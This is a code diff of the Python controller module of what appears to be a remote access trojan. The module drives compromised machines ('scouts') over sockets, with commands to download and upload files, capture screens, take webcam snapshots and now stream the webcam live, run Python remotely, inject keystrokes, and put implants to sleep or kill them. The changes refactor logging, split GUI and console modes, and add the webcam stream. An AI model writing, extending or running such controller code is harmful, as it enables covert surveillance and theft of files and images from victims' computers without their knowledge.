@@ -1,13 +1,8 @@
-import library.modules.config as config
-config.main()
-interface = config.interface
+# GUI + CUI
+# done
 import time
-import pickle
 import socket
-import library.commands.global_interface.clear as clear
-import library.commands.global_interface.quit as quit
-import library.commands.global_interface.python as python
-import library.commands.global_interface.local as local
+import readline
 import library.commands.direct_interface.python_execute_editor as python_execute_editor
 import library.commands.direct_interface.download as download
 import library.commands.direct_interface.upload as upload
@@ -15,17 +10,25 @@ import library.commands.direct_interface.screen as screen
 import library.commands.direct_interface.python_execute_file as python_execute_file
 import library.commands.direct_interface.webcam as webcam
 import library.commands.direct_interface.ping as ping
+import library.commands.direct_interface.webcam_stream as webcam_stream
 import library.modules.recv_all as recv_all
+import library.modules.send_all as send_all
+import library.modules.config as config
 import library.modules.send_and_recv as send_and_recv
 import library.modules.grid_format as grid_format
-from flask import jsonify
 
-try:
-    import readline
-except ImportError:
-    import gnureadline as readline
 
 config.main()
+interface = config.interface
+if interface == "CUI":
+    import library.commands.global_interface.clear as clear
+    import library.commands.global_interface.python as python
+    import library.commands.global_interface.local as local
+    import library.commands.global_interface.quit as quit
+elif interface == "GUI":
+    import library.modules.log as log
+    import pickle
+    from flask import jsonify
 
 valid_keys = ['\\t', '\\n', '\\r', ' ', '!', '"', '#', '$', '%', '&', "'", '(',
               ')', '*', '+', ',', '-', '.', '/', '0', '1', '2', '3', '4', '5', '6', '7',
@@ -56,40 +59,39 @@ def main(scout_id, prompt=None):
         try:
             command = prompt.split(' ', 1)[0].lower()
             if command == "disconnect":
-                data = send_and_recv.main("g "+ prompt, scout_id)
-                config.app.logger.info("[library/interfaces/direct_interface] - Message from scout: " + str(data))
+                data = send_and_recv.main("g " + prompt, scout_id)
+                log.log_normal("Message from scout: " + str(data))
                 del (config.scout_database[scout_id])
                 config.change = True
-                return "back"
+                return "return to scouts"
             elif command == "kill":
-                data = send_and_recv.main("g "+ prompt, scout_id)
-                config.app.logger.info("[library/interfaces/direct_interface] - Message from scout: " + str(data))
+                log.log_normal("Message from scout: " + send_and_recv.main("c " + prompt, scout_id))
                 del (config.scout_database[scout_id])
                 config.change = True
-                return "back"
+                return "return to scouts"
             elif command == "sleep":
-                data = send_and_recv.main("g "+ prompt, scout_id)
-                config.app.logger.info("[library/interfaces/direct_interface] - Message from scout: " + str(data))
+                data = send_and_recv.main("g " + prompt, scout_id)
+                log.log_normal("Message from scout: " + str(data))
                 if data.startswith('[*]'):
                     del (config.scout_database[scout_id])
                     config.change = True
-                    return "back"
+                    return "return to scouts"
             elif command == 'ping':
                 alive_bool = ping.main(scout_id)
                 if not alive_bool:
-                    return "back"
+                    return "return to scouts"
                 else:
                     return jsonify({"output": "Success", "output_message": "Scout is alive", "data": ""})
             elif command == "download":
-                recv_all.main_send("g " + prompt, config.scout_database[scout_id][0])
+                send_all.main(config.scout_database[scout_id][0], "g " + prompt)
                 output = download.main(config.scout_database[scout_id][0])
                 return output
             elif command == "screen":
-                recv_all.main_send("g " + prompt, config.scout_database[scout_id][0])
+                send_all.main(config.scout_database[scout_id][0], "g " + prompt)
                 output = screen.main(config.scout_database[scout_id][0])
                 return output
             elif command == "webcam":
-                recv_all.main_send("g " + prompt, config.scout_database[scout_id][0])
+                send_all.main(config.scout_database[scout_id][0], "g " + prompt)
                 output = webcam.main(config.scout_database[scout_id][0])
                 return output
             elif command == 'inj_valid':
@@ -100,7 +102,7 @@ def main(scout_id, prompt=None):
                     ret_string += '   ' + ''.join(i)
                 return jsonify({"output": "Success", "output_message": "Command Output", "data": ret_string})
             elif command == "upload":
-                output = upload.main(scout_id, prompt)
+                output = upload.main(config.scout_database[scout_id][0], prompt)
                 return output
             elif command == 'exec_py_file':
                 output = python_execute_file.main(prompt, scout_id)
@@ -108,15 +110,15 @@ def main(scout_id, prompt=None):
             else:
                 data = send_and_recv.main("g "+ prompt, scout_id)
                 if type(data) == str:
-                    config.app.logger.info("[library/interfaces/direct_interface] - Message from scout: " + str(data))
+                    log.log_normal("Message from scout: " + str(data))
                 else:
-                    config.app.logger.info("[library/interfaces/direct_interface] - Message from scout: " + str(pickle.loads(data)))
+                    log.log_normal("Message from scout: " + str(pickle.loads(data)))
                 try:
                     return jsonify({"output": "Success", "output_message": "Command Output", "data": data})
                 except:
                     return jsonify({"output": "Success", "output_message": "Command Output", "data": pickle.loads(data)})
         except (socket.error, socket.timeout):
-            config.app.logger.error('[library/interfaces/direct_interface] - Scout has unexpectedly died, removing from database...')
+            log.log_error('Scout has unexpectedly died, removing from database...')
             del (config.scout_database[scout_id])
             config.change = True
             return jsonify({"output": "Fail", "output_message": "Scout is dead, removing from database...", "data": ""})
@@ -145,8 +147,7 @@ def main(scout_id, prompt=None):
                     print(config.inf + 'Returning...')
                     return
                 elif command == 'kill':
-                    data = send_and_recv.main("c "+ prompt, scout_id)
-                    print(data)
+                    print(send_and_recv.main("c " + prompt, scout_id))
                     del (config.scout_database[scout_id])
                     print(config.inf + 'Returning...')
                     return
@@ -160,23 +161,26 @@ def main(scout_id, prompt=None):
                 elif command == 'quit':
                     quit.main()
                 elif command == 'sleep':
-                    data = send_and_recv.main("c "+ prompt, scout_id)
+                    data = send_and_recv.main("c " + prompt, scout_id)
                     print(data)
                     if data.startswith('[*]'):
                         del (config.scout_database[scout_id])
                         print(config.inf + 'Returning...')
                         return
                 elif command == 'download':
-                    config.scout_database[scout_id][0].sendall(("c "+ prompt).encode())
+                    send_all.main(config.scout_database[scout_id][0], "c " + prompt)
                     download.main(config.scout_database[scout_id][0])
                 elif command == 'upload':
-                    upload.main(scout_id, prompt)
+                    upload.main(config.scout_database[scout_id][0], prompt)
                 elif command == 'screen':
-                    config.scout_database[scout_id][0].sendall(("c "+ command).encode())
+                    send_all.main(config.scout_database[scout_id][0], "c " + command)
                     screen.main(config.scout_database[scout_id][0])
                 elif command == 'webcam':
-                    config.scout_database[scout_id][0].sendall(("c "+ command).encode())
+                    send_all.main(config.scout_database[scout_id][0], "c " + command)
                     webcam.main(config.scout_database[scout_id][0])
+                elif command == 'webcam_stream':
+                    send_all.main(config.scout_database[scout_id][0], "c " + prompt)
+                    webcam_stream.main(config.scout_database[scout_id][0])
                 elif command == 'ping':
                     alive_bool = ping.main(scout_id)
                     if not alive_bool:
@@ -197,13 +201,9 @@ def main(scout_id, prompt=None):
                 elif not command:
                     pass
                 else:
-                    data = send_and_recv.main("c "+ prompt, scout_id)
+                    send_all.main(config.scout_database[scout_id][0], "c " + prompt)
+                    data = recv_all.main(config.scout_database[scout_id][0])
                     print(data)
-            except EOFError:
-                try:
-                    time.sleep(2)
-                except KeyboardInterrupt:
-                    quit.main()
             except KeyboardInterrupt:
                 quit.main()
             except (socket.error, socket.timeout):
